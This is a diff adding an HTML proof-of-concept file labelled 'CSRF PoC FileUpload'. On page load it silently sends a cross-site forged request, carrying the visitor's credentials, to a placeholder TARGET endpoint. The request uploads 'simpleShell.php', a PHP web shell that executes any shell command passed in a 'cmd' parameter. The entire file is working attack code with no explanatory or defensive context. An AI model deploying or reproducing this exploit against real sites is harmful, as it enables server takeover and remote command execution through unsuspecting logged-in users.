@@ -1,0 +1,48 @@
+<html>
+  <!-- CSRF PoC FileUpload-->
+  <body onload="document.forms[0].submit();">
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://TARGET/target.php", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
+        xhr.withCredentials = "true";
+        var body = "-----------------------------256672629917035\r\n" +
+          "Content-Disposition: form-data; name=\"message\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------256672629917035\r\n" +
+          "Content-Disposition: form-data; name=\"backPage\"\r\n" +
+          "\r\n" +
+          "test\r\n" +
+          "-----------------------------256672629917035\r\n" +
+          "Content-Disposition: form-data; name=\"dataType\"\r\n" +
+          "\r\n" +
+          "test  \r\n" +
+          "-----------------------------256672629917035\r\n" +
+          "Content-Disposition: form-data; name=\"file\"; filename=\"simpleShell.php\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "<?php\r\n" +
+		  "if(isset($_REQUEST['cmd'])){\r\n" +
+		  "    $cmd = ($_REQUEST['cmd']);\r\n" +
+		  "    system($cmd);\r\n" +
+		  "    echo '<pre>', $cmd, '</pre>';\r\n" +
+		  "   die;\r\n" +
+		  "}\r\n" +
+		  "?>\r\n" +
+          "-----------------------------256672629917035--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+	<iframe name="send" style="display:none"></iframe>
+    <form target="send" action="https://TARGET/target.php" onsubmit="submitRequest();">
+    </form>
+  </body>
+</html>
